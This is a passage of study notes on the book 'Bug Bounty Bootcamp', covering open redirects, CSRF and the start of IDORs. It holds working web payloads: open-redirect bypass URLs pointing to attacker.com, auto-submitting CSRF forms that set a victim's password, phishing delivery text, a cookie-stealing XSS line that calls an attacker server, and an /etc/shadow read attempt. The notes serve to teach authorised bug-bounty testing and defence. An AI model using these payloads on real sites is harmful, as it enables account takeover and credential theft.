1. Look for user input opportunities on the application. When user input is stored and used to construct a web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS.
2. Insert XSS payloads into the user input fields you've found. Insert payloads from lists online, a polyglot payload, or a generic test string.
3. Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server.
4. If you can't get any payloads to execute, try bypassing XSS protections.
5. Automate teh XSS hunting process with techniques introduced in Chapter 25.
6. Consider the impact of the XSS you've found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you've found?
7. Send your first XSS report to a bug bounty program!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 7: Open Redirects

"Sites often use HTTP or URL parameters to redirect users to a specified URL without any user action. While this behavior can be useful, it can also cause _open redirects_, which happen when an attacker is able to manipulate the value of this parameter to redirect the user offsite."

**Mechanisms**

- Sites often redirect unauthenticated users to a login page when try to to access a page that requires authentication. After authentication, the user could then be redirected back to the specific page they were trying to access before authentication.
  - To redirect them back to the page they were trying to access, the site needs to remember where they were trying to go.
  - To do this, the site uses some sort of redirect URL parameter appended to the URL to keep track of the user's original location.
  - ex: `https://example.com/login?redirect=https://example.com/dashboard` will redirect a user to `https://example.com/dashboard` after they authenticate on the login page.
  - This is a very common functionality included on modern websites.
  - An attacker could provide a user with a link like `https://example.com/login?redirect=http://attacker.com`
    - The victim may see the familiar https://example.com and not notice that it's redirecting somewhere else. The malicious website attacker.com could then try to emulate the login page of the real website to phish for credentials.
- Referer-based open redirects use the `referer` HTTP request header that browsers automatically include.
  - Attackers can host a site that links to the victim site to set the referer header of the request using HTML like this:
    ```
    <html>
    <a href="https://example.com/login">Click here to login to example.com<a/>
    </html>
    ```
  - This uses a <a> tag that links the text in the tag to another location.
  - "If example.com uses a referer-based redirect system, the user's browser would redirect to the attacker's site after the user visits example.com, because the browser visited example.com via the attacker's page."

**Prevention**

- "Sites often implement URL validators to ensure that the user-provided redirect URL points to a legitimate location. These validators use either a blocklist or an allow list."
  - Blocklists check whether the redirect has indicators of a malicious redirect and blocks those that do.
    - Known malicious hostnames or special URL characters that are often used in open-redirect attacks.
  - Allowlists will check the hostname portion of the URL to ensure it matches their list of allowed hosts allowing those that do, and blocking those that don't.
- Validators have a hard time identifying the hostname portion of the URL making open redirects a very common vulnerability.

**Hunting for Open Redirects**

Step 1: Look for Redirect Parameters

- `https://example.com/login?redirect=https://example.com/dashboard`
- `https://example.com/login?redir=https://example.com/dashboard`
- `https://example.com/login?next=https://example.com/dashboard`
- `https://example.com/login?next=/dashboard`
- In your proxy, look for parameters that contain absolute or relative URLs.
  - Absolute URLs are complete and contain all the components necessary to locate the resource it points to: `https://example.com/login`
    - URL scheme, hostname, path to resource
  - Relative URLs are concatenated with another URL by the server to be used: `https://example.com/login?next=dashboard`
    - parameters to look for: redirect, redir, RelayState, next, u, n, forward.
  - Record any parameters that seem to be used for redirect.
  - Note pages that don't contain redirect parameters in the URL but still automatically redirect the user.
    - These are possible referer-based open redirects.
    - 3XX response codes like 301, and 302 indicate a redirect.

Step 2: Use Google Dorks to Find Additional Redirect Parameters

- `site:example.com`
  - Look for pages that contain URLs in their URL parameters using `%3D` which is URL-encoded equals sign "=".
    - `inurl:%3Dhttp site:example.com` to find things like: `https://example.com/login?next=https://example.com/dashboard`
  - `%2F` is URL-encoded "/"
    - `inurl:%3D%2F site:example.com` to find `https://example.com/login?n=/dashboard`
  - Search for well known URL redirect parameters:
    - `inurl:redir site:example.com`
    - `inurl:redirect site:example.com`
    - `inurl:redirecturi site:example.com`
    - `inurl:redirect_uri site:example.com`
    - `inurl:redirecturl site:example.com`
    - `inurl:redirect_url site:example.com`
    - `inurl:return site:example.com`
    - `inurl:returnurl site:example.com`
    - `inurl:relaystate site:example.com`
    - `inurl:forward site:example.com`
    - `inurl:forwardurl site:example.com`
    - `inurl:forward_url site:example.com`
    - `inurl:url site:example.com`
    - `inurl:uri site:example.com`
    - `inurl:dest site:example.com`
    - `inurl:destination site:example.com`
    - `inurl:next site:example.com`

Step 3: Test for Parameter-Based Open Redirects

- Insert a random hostname or hostname you own into the redirect parameters.
- Some may redirect immediately, other may not redirect until you've successfully completed a user action (registration, login, or logout).
  - For these, you will need a user account to test the functionality.
- If they redirect to the hostname you've inserted, Bingo!

Step 4: Test for Referer-Based Open Redirects

- When you find a redirect that is not contained in a redirect URL parameter, host the following on a domain you own:
  ```
  <html>
    <a href="https://example.com/login">Click on this link!</a>
  </html>
  ```
  - Click the link on your domain to go to example.com and see if you are redirected automatically or after performing a user action.

#### Bypassing Open-Redirect Protection

- Author states that they find open-redirects in almost all of the URLs they attack. This is mainly because different browsers interpret redirects differently and so redirect traffic differently.
  - You can often find an open-redirect in one browser, but not in another.

**Using Browser Autocorrect**

- "Browsers often autocorrect URLs that don't have the correct components, in order to correct mangled URLs caused by user typos. For example, Chrome will interpret all of these URLs as pointing to https://attacker.com"
  `https:attacker.com`
  `https;attacker.com`
  `https:\/\/attacker.com`
  `https:/\/\attacker.com`
  - Bypass URL validation based on a blocklist by intentionally misspelling the url.
    - If any URL containing https:// or http:// is blocked by the application, try misspelling it as https;// and see if it works.
- ex. `https://attacker.com\@example.com`
  - If the `\` is interpreted as a path separator, it will interpret the hostname to be example.com and attacker.com\ as the username portion of the URL.
  - If the browser autocorrects the backslash to a forward slash, it will redirect to attacker.com and treat @example.com as the path portion of the URL.
    - `https://attacler.com/@example.com`

**Exploiting Flawed Validator Logic**

- URL validators often check to see if the redirect starts with, contains, or ends with the site's domain listed on the allowlist.
  - Create a subdomain or directory with the target's domain name:
    `https://example.com/login?redir=http://example.com.attacker.com` or
    `https://example.com/login?redir=http://attacker.com/example.com`
  - To bypass validators that require URLs to both start and end with a domain listed on the allowlist:
    `https://example.com/login?redir=https://example.com.attacker.com/example.com`
    - The browser interprets the first example.com as the subdomain and the second as the filepath.
  - Use the at symbol (@) to make the first example.com the username portion of the URL:
    `https://example.com/login?redir=https://example.com@attacker.com/example.com`
  - Custom URL validators are prone to these attackers because usually not all edge cases are considered.

**Using Data URLs**

- Manipulate the scheme portion of the URL to fool validators:
  - Format: `data:MEDIA_TYPE[;base64],DATA`
  - Plain text message with this data scheme: `data:text/plain,hello!`
  - To base64 encode the above: `data:text/plain;base64,aGVsbG8h`
  - Base64-encoded redirect URL to evade validator: `data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=`
    - The high entropy string is base64 encoded: `<script>location="https://example.com"</script>`
    - The usage looks like this: `https://example.com/login?redir=data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=`

**Exploiting URL Decoding**

- URL-encoding converts special characters into % followed by two hex digits. ex. / = %2f.
- Validators and browsers both decode URLs from their URL encoded forms to find out what is contained in the URL.
  - If the browser and the validator decode the characters differently, you can exploit this.

_Double Encoding_

- Double or triple encode special characters in your payloads:
  - Single encoded / : `https://example.com%2f@attacker.com`
  - Double encoded / : `https://example.com%252f@attacker.com`
  - Triple encoded / : `https://example.com%25252f@attacker.com`
- If the browser doesn't double decode URLs, but the browser does, you can use this payload:
  `https://attacker.com%252f@example.com`
  - The validator sees example.com as the hostname, but the browser redirects to attacker.com.

_Non-ASCII Characters_

- Some browsers decode non-ASCII characters into question marks.
  - If this is the case: `https://attacker.com%ff.example.com` the validator would interpreted as example.com being the domain name, and attacker.comÿ as the subdomain.
    - If the browser decodes the non-ASCII character as a ?, then it interprets it as `https://attacker.com?.example.com` where example.com is part of the URL query, not the hostname, and the browser would navigate to attacker.com.
- Browsers also often try to find "most alike" substitutions when given special characters for example ╱ (%E2%95%B1) will often be subsituted with /.
  - `https://attacker.com╱.example.com` may make it past the validator and be converted by the browser into `https://attacker.com/.example.com`
  - "The _Unicode_ standard is a set of code developed to represent all of the world's languages on the computer. You can find a list of Univode characters at [http://www.unicode.org/charts/. Use the Unicode chart to find look-alike characters and insert them into URLs to bypass filters. The \*Cyrillic character set is especially useful since it contains many characters similar to ASCII characters."

_Combining Exploit Techniques_

- ex. `https://example.com%252f@attacker.com/example.com`
  - Bypasses protection that only checks URL contains, starts with, or ends with an allowlisted hostname by making the URL both start and end with example.com.
  - Most browsers interpret `example.com%252f` as the username portion of the URL.
  - If the validator over decodes the URL, it will see example.com as the hostname portion: `https://example.com/@attacker.com/example.com`

**Escalating the Attack**

- Sending an email with a URL that looks like: `https://example.com/login?next=https://attacker.com/fake_login.html` to a user that redirects to an attackers fake login page that looks like the legitimate site could be a good way to steal creds.
  - The victim may see a login error on the malicious page that reads something like: "Sorry! The password you provided was incorrect. Please enter your username and password again."
  - Bonus points for redirecting the victim back to the legitimate site to keep them from catching on.
- Use open-redirects to bypass blocklists and allowlists:
  - `https://example.com/?next=https://attacker.com/` could bypass well build validators because it's technically still on the legitimate website.
  - "If a site utilizes an allowlist to prevent SSRFs, and allows requests to only a list of redefined URLs, an attacker can utilize an open redirect within those allowlisted pages to redirect the request anywhere."
- Use open-redirects to steal credentials and 0Auth tokens.
  - Browsers often include the originating URL as a referer HTTP request header, the originating URL contains sensitive information like authentication tokens.
  - You can use an open-redirect to steal the tokens via the referer header.

**Finding Your First Open Redirect!**

1. Search for redirect URL parameters. These might be vulnerable to parameter-based open redirect.
2. Search for pages that perform referer-based redirects. These are candidates for a referer-based open redirect.
3. Test the pages and parameters you've found for open redirects.
4. If the server blocks the open redirect, try the protection bypass techniques mentioned in this chapter.
5. Brainstorm ways of using the open redirect in your other bug chains!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 8: ClickJacking

"_Clickjacking_, or user-interface redressing, is an attack that tricks users into clicking a malicious button that has been made to look legitimate. Attackers achieve this by using HTML page-overlay techniques to hide one webpage within another..."

- Clickjacking is rarely considered in scope for bug bounty programs, but not always - if you can demonstrate the impact of the clickjacking vulnerability AND it's not listed as out of scope.

I'm going to leave this out for now. If you're interested in learning more about clickjacking, buy the book, it's good!

### Chapter 9: Cross-Site Request Forgery

"_Cross-site request forgery_ (CSRF) is a client-side technique used to attack other users of a web application. Using CSRF, attackers can send HTTP request that pretend to come from the victim, carrying out unwanted actions on a victim's behalf. For example, an attacker could change your password or transfer money from your bank account without your permission. CSRF attacks specifically target state-changing rquests, like sending tweets and modifying user settings, instead of request that reveal sensitive user info. This is because attackers won't be able to read the response to the forged request sent during a CSRF attack."

**Mechanisms**

- Most modern web apps authenticate users and manage user sessions using session cookies.
  - When you login, the web app sends your browser a session cookie and this cookie is used to prove your identity to the server.
- When you login the server sends your browser the session cookie via an HTTP response header called `Set-Cookie`
  - ex: `Set-Cookie: session_cookie=YOUR_SESSION_COOKIE;`
  - Your browser receives, stores, and then sends the session cookie via the `Cookie` HTTP request header in every request: `Cookie: session_cookie:YOUR_SESSION_COOKIE;`
  - The cookie acts as a constant authentication check to perform all requests that would require the user to be authenticated (change passwords, make posts, etc.).
- Below is an example of CSRF vulnerable HTML:

```
<html>
  <h1>Send a tweet.</h1>
  <form method="POST" action="https://twitter.com/send_a_tweet">
    <input type="text" name="tweet_content" value="Hello world!">
    <input type="submit" value="Submit">
  </form>
</html>
```

- Breakdown:
  - `<h1>` tag denotes a first-level HTML heading.
  - `<form>` tag defines the beginning and end of an HTML form.
    - `POST` method attribute means the form will perform a POST request.
    - `action` attribute tells the POST attribute where to send the post request.
    - `<input>` tags specify an input field where users can enter data.
      - The first is a "text" input tag named "tweet_content" and the value (or what the user input) is "Hello World."
      - The second is an input button that will "Submit" the user input.
- The Post request for this would look something like this:

  ```
  POST /send_a_tweet
  Host: twitter.com
  Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE

  (POST request body)
  tweet_content="Hello world!"
  ```

- The vulnerability is that any site, not just Twitter, can initiate the request.
  - If you hosted this HTML on your own site and your site then posts to twitter, your browser will automatically include your Twitter session cookies in requests to Twitter.
- Here's a more realistic malicious CSRF page:

  ```
  <html>
    <iframe style+"display:none" name="csrf-frame">
      <form method="POST" action="https://twitter.com/send_a_tweet"
      target="csrf-frame" id="csrf-form">
        <input type="text" name="tweet_content" value="Follow @vickieli7 on twitter!">
        <input type='submit' value="Submit">
      </form>
    </iframe>

    <script>document.getElementById("csrf-form").submit();</script>
  </html>
  ```

  - An `<iframe>` is an HTML element that embeds another document within the current HTML document, and it's invisible to the user when the style is set to `display:none`.
    - The JavaScript `<script>` tag then submits the form with the ID _csrf-form_
    - The code fetches the HTML form by referring to it by it's ID (_csrf-form_).
  - This attack page will force any victim who visits the malicious site to tweet.
    - Think nefarious advertising campaign, or spreading malicious links through users who visit the page.

- The impact of a CSRF is largely dependent on where the CSRF vulnerability is found.
  - If you find a CSRF on a request to change password, you could take over user accounts.
  - If you find a CSRF on a empty shopping cart request, you may only be able to annoy users.
  - CSRFs in functionalities like account balance transfers would be very significant for obvious reasons.
  - You can also use CSRFs to trigger injection vulnerabilities like XSS and command injections.

**Prevention**

- Use _CSRF tokens_
  - These can be embedded into every form on a website and browsers will send this string along withe very state-changing request.
  - The website then validates the token to make sure the request came from their website.
  - These are random and unpredictable strings (high entropy)
  - CSRF tokens must be unique for each sessions and HTML form.
- Example:

  ```
  <form method="POST" action="https://twitter.com/send_a_tweet">
    <input type="text" name="tweet_content" value="Hello world!">
    <input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b">
    <input type="submit" value="Submit">
  </form>
  ```

  - This results in the follow POST request:

  ```
  POST /send_a_tweet
  Host: twitter.com
  Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE

  (POST request body)
  tweet_content="hello world!"&871caef0757a4ac9691aceb9aad8b65b
  ```

- Many frameworks have CSRF tokens build in, so you can use your frameworks implementation (Joomla, Spring, Struts, Ruby on Rails, .NET).
- You can also use `SameSite` cookies with the `Set-Cookie` header by using the `SameSite` flag set to `Strict`.
  `Set-Cookie: PHPSESSID=UEhQUOVTUO1E; Max-Age=86400; Secure; HttpOnly; SameSite=Strict`
  - `SameSite` flag can also be set to `Lax`, which tells the client's browser to send a cookie only in requests that cause top-level navigation (when users actively click a link and navigate to the site).
    - Ensures that users have access to the resources on your site if the cross-site request is intentional.
    - If you login to a web app from a 3rd-party site, the login will be sent. But if the 3rd-party tries to send a POST request to the web app, or tries to embed the contents of the web app within an iframe, cookies won't be sent:
      `Set-Cookie: PHPSESSID=UEhQUOVTUO1E; Max-Age=86400; Secure; HttpOnly; SameSite=Lax`
  - SameSite=Lax and Samesite=Strict prevent browsers from sending cookies on POST or AJAX requests and within iframes and image tags.
- Some browsers set their default cookie settings to `SameSite=Lax` so that even if a web application isn't using the `SameSite` flag, your browser will still protect you against.
  - In 2024, Firefox still doesn't have this enabled by default. To enable:
    - Navigate to `about:config`
    - In the search bar: `network.cookie.sameSite.laxByDefault` and click the swap arrows on the right to set to True.
- You may still be able to conduct a CSRF attack even if a browser or web app is using `SameSite=Lax` as default if the site allows state-changing request with the GET HTTP method.
  - ex link: `https://email.example.com/password_change?new_password=adc123` if the password change is conducted with a GET request.
  - Because this link will cause top-level navigation, the user's session cookies with be included in the GET request and the CSRF attack will succeed.
    ```
    GET /password_change?new_password=adc123
    Host: email.example.com
    Cookie: session_cookie=YOUR_SESSION_COOKIE
    ```
- "When websites don't implement `SameSite` cookies or other CSRF protection from every state-changing request, the request becomes vulnerable to CSRF if the user is not using a `SameSite-by-default browser`. CSRF protection is still the responsibility of the website despite the adoption of `SameSite-by-default`."

**Hunting for CSRFs**
"CSRFs are common and easy to exploit. To look for them, start by discovering state-changing requests that aren't shielded by CSRF protections."

Step 1: Spot State-Changing Actions

- Change password: _email.example.com/password_change_
  POST request

  Request parameters: _new_password_

- Send email: _email.example.com/send_email_
  POST request

  Request parameters:_draft_id, recipient_id_

- Delete email:\*email.example.com/delete_email
  Post request

  Request parameters:_email_id_

Step 2: Look for a Lack of CSRF Protections

- Visit the endpoints you found in Step 1 running a proxy like BurpSuite in the background and start intercepting all the requests you can generate (send an email, delete an email, change a password, etc.).
- Check the requests you've sent in your proxy to see if their vulnerable (look at the request sent for changing a password, deleting an email, etc.)
- Search the requests using the search bar at the bottom of Burp for things like "csrf" or "state"
  - These CSRF protections may show up in request headers, cookies, and URL parameters.
  - Even if you find CSRF protections on an endpoint, you could still be able to bypass them.

Step 3: Confirm the Vulnerability

- Test the potentially vulnerable CSRF endpoints by crafting an HTML page like this (Make sure to end the file in .html so it loads into your browser):

  ```
  <html>
    <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
      <input type="text" name="new_password" value="abc123">
      <input type="submit" value="Submit">
    </form>
    <script>document.getElementById("CSRF-form").submit();</script>
  </html>
  ```

  - Open the HTML page in your browser that is signed into your target site. This form will generate a request like this:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE

  (POST request body)
  new_password=adc123
  ```

  - Check if your password on email.example.com has been changed to abc123.
    - The goal to to prove that a foreign site can carry out state-changing actions on a user's behalf.

- Websites without CSRF tokens can still protect against CSRF attacks by checking that the referer header of the request matches a legitimate URL.
  - This helps by filtering out requests that have originate from foreign sites.
  - Referer headers can be manipulated by attackers and aren't a foolproof mitigation solution.
- Combine CSRF tokens and `SameSite` session cookies for the best protection.

**Bypassing CSRF Protection**

- Modern websites are becoming more secure and most of them have some form of CSRF protection. You still may be able to exploit a website that has CSRF protections by modifying your payloads.

_Change the Request Method_

- If sites accept multiple request methods for the same endpoint and the CSRF protections are only in place for one method, your attack may succeed.
  - ex: The following POST request is protected from CSRF attacks.
  ```
  POST /password_change
  Host: email.example.com
  Cookie: sessions_cookie=YOUR_SESSION_COOKIE
  ```
  - The same request with a GET method may work:
  ```
  GET /password_change?new_password=abc123
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE
  ```
  - So a malicious page could looke like this:
  ```
  <html>
    <img src="https://email.example.com/password_change?new_password=abc123"/>
  </html>
  ```
  - The HTML tag `<img>` loads an image from an external source and will send a GET request to the URL specified in its `src` attribute.
    - Check to see if the password has changed after your load the HTML page and if it does, the website is vulnerable to CSRF.
  - You can swap the other way too, from GET to POST.

_Bypass CSRF Tokens Stored on the Server_

- "If the site isn't validating CSRF tokens in the right way, you can still achieve CSRF with a few modification of your malicious HTML page."
- Test if deleting the token parameter or sending a blank token parameter will work. Below is a POST request with a CSRF token:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE

  (POST request body)
  new_password=adc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
  ```

  - You can change the last line containing the csrf_token to be either:
    `new_password=abc123` or,
    `new_password=abc123&csrf_token=`
  - The HTML form for these would look like the following, respectively:

  ```
  <html>
    <form method="POST" action="https://email.example.com/password_change" ud="csrd-form">
      <input type="text" name="new_password" value="abc123">
      <input type='submit' value="submit">
    </form>
    <script>document.getElementById("CSRF-form").submit();</script>
  </html>
  ```

  and:

  ```
    <html>
    <form method="POST" action="https://email.example.com/password_change" ud="csrd-form">
      <input type="text" name="new_password" value="abc123">
      <input type="text" name="csrf_token" value="">
      <input type='submit' value="submit">
    </form>
    <script>document.getElementById("CSRF-form").submit();</script>
  </html>
  ```

  - These types of bypass can often work because applications often only validate the token _if_ the token exists, or if the token parameter isn't blank.
  - The following is a code example of insecure csrf token validation:

  ```
  def validate_token():
    if (request.csrf_token == session.csrf_token):
      pass
    else:
      throw_error("CSRF token incorrect. Request rejected.")
  [...]

  def process_state_changing_action():
    if request.csrf_token:
      validate_token()
    execute_action()
  ```

  - This python code checks to see if a CSRF token exists with `if request.csrf_token`, if it exists, it validates the token and the code continues.
    - You can see how if the token doesn't exist the code will skip validation and proceed to run.

- You can also try submitting the request with another session's CSRF token.

  - This works if the application checks that a csrf-token is valid, but does not check whether it belongs to the current user.
  - You would then use another users account or ID, and use your csrf-token in place of theirs. If it's vulnerable, you can change any users password by using your token.
  - Vulnerable code may look like this:

  ```
  def validate_token()
    if request.csrf_token:
      if (request.csrf_token is valid_csrf_tokens):
        pass
      else:
        throw_error("CSRF token incorrect. Request rejected.")

  [...]

  def process_state_changing_action():
    validate_token()
    execute_action()
  ```

  - This checks if the token exists in the list of valid tokens with `if (request.csrf_token in valid_csrf_tokens):` and if it does, the execution continues.
    - You can see that so long as you're using a token that exists, you can execute the action.

_Bypass Double-Submit CSRF Tokens_

- Sites can also use _double-submit cookies_ to defend against CSRF and in so the state-changing request contains the same random token as both a cookie and a request parameter.

  - The server checks whether the two values are equal, if the values match, the request is seen as legitimate, otherwise the application rejects it.
  - ex. valid request:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b

  (POST request body)
  new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
  ```

  - The server only checks whether the token in the cookies is the same as the token in the request parameters, it does not check whether the tokens themselves are valid.
  - "If the application uses double-submit cookies as its CSRF defence mechanism, it's probably not keeping records of the valid token server-side. If the server were keeping records of the CSRF token server-side, it could simply validate the token when it was sent over, and the application would not need to use double-submit cookies in the first place."
    - You could set the `csrf_token=not_a_real_token` and if both the request parameter token and the cookie token are the same, it will work with double-submit.
  - To execute a double-submit CSRF token attack, you will need to know about _Session fixation_, which is an attack that allows attackers to select the session cookies of the victim. Learn more about _Session Fixation_ [here](https://en.wikipedia.org/wiki/Session_fixation).

_Bypass CSRF Referer Header Check_

- If the website is verifying that the referer header sent with the state-changing request is a part of the website's allowlisted domains, it will perform this verification and either reject or execute the request based only on the referer header.
- Start by removing the referer header. To do this add a `<meta>` tag to the page hosting your request form:

  ```
  <html>
    <meta name="referrer" content="no-referrer">
    <form method="POST" action="https://email.com/password_change" id="csrf-form">
      <input type="text" name="new_password" value="abc123">
      <input type='submit' value="Submit">
    </form>
    <script>document.getElementById("CSRF-form").submit();</script>
  </html>
  ```

  - This tells the browser not to include a referer header in the resulting HTTP request.
  - The faulty application logic might look like this:

  ```
  def validate_referer():
    if (request.referer in allowlisted_domains):
      pass
    else:
      throw_error("Referer incorrect. Request rejected.")

  [...]

  def process_state_changing_action():
    if request.referer:
      validate_referer()
    execute_action()
  ```

  - Similar to earlier examples, this application only validates the referer header if it exists. By making the victim's browser omit the referer header, you bypass this CSRF protection.

- You may also be able to bypass the logic check used to validate the referer URL if the application looks for the string "example.com" in the referer URL.

  - The logic would look something like this:

  ```
  def validate_referer():
    if request.referer:
      if ("example.com" in request.referer):
        pass
      else:
        throw_error("Referer incorrect. Request rejected.")

  [...]

  def process_state_changing_action():
    validate_referer()
    execute_action()
  ```

  - The logic can be exploited by creating a subdomain named after the victim's domain, then hosting a malicious HTML on that subdomain. The request looks like:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE
  Referer: example.com.attacker.com

  (POST request body)
  new_password=abc123
  ```

  - Alternatively, you could place the victim domain name as a pathname:

  ```
  POST /password_change
  Host: email.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE
  Referer: attacker.com/example.com

  (POST request body)
  new_password=abc123

  ```

  - After you've uploaded your HTML page at the correct location, load that page and see if the state-changing action was executed.

_Bypass CSRF Protection by Using XSS_

- "Any XSS vulnerablity will defeat CRSF protection, because XSS will allow attackers to steal the legitimate CSRF token and then craft forged requests by using CMLHttpRequest. Often, attackers will find XSS as the starting point to launch CSRFs to take over admin accounts."

**Escalating the Attack**

"After you've found a CSRF vulnerablity, don't just report it right away! Here are a few ways you can escalate CSRFs into severe security issues to maximize the impact of your report. Often, you need to use a combination of CSRF and other minor design flaws to discover these."

_Leak User Information by Using CSRF_

- ex. example.com sends monthly billing reports to users register email address. These emails could contain billing information, street addresses, phone numbers, credit card info, etc.
  - By changing a users email address to one you choose, you could have this information sent to you instead.
  - To do this, you'll want to look for something like a `POST /change_billing_email` endpoint.

_Create Stored Self-XSS by Using CSRF_

- Self-XSS are usually considered non-issues because they require so much action from the victim to succeed and so are too difficult to exploit.
- Combining CSRF with self-XSS can turn self-XSS into stored XSS - the money maker!
- ex. finance.example.com allows users to create nicknames for their linked bank accounts, and this endpoint is vulnerable to self-XSS because there is no sanitization, validation, or escaping for user input on the field. Only the user can edit and see this field, so there is no way for an attacker to trigger the XSS directly.

  - If this endpoint is vulnerable to CSRF, say, because omitting the token parameter in the request will bypass CSRF protection, the following request could work:

  ```
  POST /change_account_nickname
  Host: finance.example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE

  (POST request body)
  account=0
  &nickname="<script>document.location='http://attacker_server_ip/
  cookie_stealer.php?c='+document.cookie;</script>"
  ```

  - This request will change the user's account nickname and store the XSS payload there. The next time a user logs into the account and views their dashboard, they'll trigger the XSS.

_Take Over User Accounts by Using CSRF_

- Taking over accounts via CSRF isn't that uncommon. All you need is a CSRF vulnerability in a critical functionality like password creation, password changes, changing email addresses, resetting passwords.
- A good place to look for this is on site that allow users to sign up using social media accounts which means they won't need to set a password. These sites will also often give users who've signed up via social media accounts the option of setting a password via a request similar to:

  ```
  POST /set_password
  Host: example.com
  Cookie: session_cookie=YOUR_SESSION_COOKIE

  (POST request body)
  password=XXXXX&csrf_token=871caef0757a4ac9691aceb9aad8b65b
  ```

  - Because they originally signed up via social media, there is no "old password" to set the new password.
  - If the endpoint is vulnerable to CSRF, all an attacker has to do is post a link to this HTML page somewhere that the user of the site might frequent, and they can automatically assign the password of any user who visists the malicious page:

  ```
  <html>
    <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
      <input type="text" name="new_password" value="this_account_is_now_mine">
      <input type="text" name="csrf_token" value="">
      <input type='submit' value="Submit">
    </form>
    <script>document.getElementById("csrf-form").submit():</script>
  </html>
  ```

**Delivering the CSRF Payload**

1. The easiest way to deliver a payload is to trick users into visiting a malicious link by posting them on forums or social media platforms:
   "Visit this page to get a discount on your example.com subscription:
   https://example.attacker.com"

- The attacker then host an auto-submitting form to execute the CSRF:

```
<html>
  <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
    <input type="text" name="new_password" value="this_account_is_now_mine">
    <input type='submit' value="Submit">
  </form>
  <script>document.getElementById("csrf-form").submit();</script>
</html>
```

2. CSRFs that can be executed through a GET request can embed the request as an image directly through an image posted to a forum. So anyone who views the forum page would be affected:
   `<img src="https://email.example.com/set_password>new_password=this_account_is_now_mine">`

3. Attackers can deliver a CSRF payload to a large number of users by exploiting stored XSS. If a forum comment field if vulnerable to stored XSS the payload can be delivered to all visitors who visit the forum:

```
<script>
  document.body.innerHTML += "
    <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
      <input type="text" name="new_password" value"this_account_is_now_mine">
      <input type='submit' value="Submit">
    </form>;
  document.getElementById("csrf-form").submit();
</script>
```

**Finding Your First CSRF!**

1. Spot the state-changing actions on the application and keep a ntoe on their locations and functionality.
2. Check these functionalities for CSRF protection. If you can't spot any protections, you might have found a vulnerability!
3. If any CSRF protection mechanisms are present, try to bypass the protection by using the protection-bypass techniques mentioned in this chapter.
4. Confirm the vulnerability by crafting a malicious HTML page and visisting that page to see if the action was executed.
5. Think of strategies for delivering your payload to end users.
6. Draft your first CSRF report!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 10: Insecure Direct Object References (IDORs)

"Like XSS and open redirects, _insecure direct object references_ (IDORs) are a type of bug present in almost every web application. They happen when the application grants direct access to a resource based on the user's request, without validation."

**Mechanisms**

- IDORs boil down to when users can access resources that do not belong to them by directly referencing the object ID, object number, or filename - this breaks access control.
- ex. Your user ID is 1234, and on example.com you can access your private messages by navigating to `https://example.com/messages?user_id=1234`. If you change the `user_id` to `user_id=2233` and you can see another users private messages, you've found an IDOR.
  - ex. code for this vulnerability:
    ```
    messages = load_messages(request.user_id)
    display_messages(messages)
    ```
- IDORs can also be present in state-changing endpoints like /change_password.
- IDORs often affect database objects.
- They can happen when an application references a system file directly.
  - This request allows users to access a file they've uploaded:
    `https://example.com/uploads?file=user1234-01.jpeg`
  - The above also provides a clue about the naming convention of uploaded files: "USER_ID-FILE_NUMBER.FILE_EXTENSION."
    - An attacker could use this naming convention to access anyone's uploaded files by guessing the filenames.
  - An attacker might also be able to view sensitive system files through the vulnerable endpoint with something like this: `https://example.com/uploads?file=/PATH/TO/etc/shadow`
    - Scanning with nmap can reveal things like the OS, OS version, and versions of the applications running on the server. Using this information can also help narrow the search for sensitive system files.

**Prevention**

- "IDORs happen when an application fails at two things. First, it fails to implement access control basedon user identity. Second, it fails to randomize object IDs and instead keeps references to data objects, like a file or a database entry, predictable."
- Applications can prevent IDORs by checking the user's identity and permissions before granting access to a resource, for example, by checking if the user's session cookies correspond to the `user_id` that the resources belong to.
  - The website can also use a unique, unpredictable key or a hashed identifier to reference each user's resources.
    - In the first example in this session, it was easy to guess another users `user_id`, but if the user IDs were hashed the same resource would look more like this: `https://example.com/messages?user_key=6MT9Ea1V9F7r9pns0mK1eDAEW`
    - If the hash `6MT9Ea1V9F7r9pns0mK1eDAEW` represents `user_id=1234`, good luck guessing `user_id=2233`!
- Attackers could still leak user information if they can find a way to steal these URLs or user_keys.
- The best way to protect against IDORs is fine-grained access control, or a combination of access control and randomization or hashing of IDs.

**Hunting for IDORs**

- A source code review that checks if all direct object references are protected by access control is a great way to find IDORs.

_Step 1: Create Two Accounts_

- Create 2 accounts for every permission level: admin accounts, 2 regular user accounts, two group member accounts, and two non-group-member accounts.
  - Doing this allows for testing access control issues among similar user accounts, as well as between different privilege level accounts.
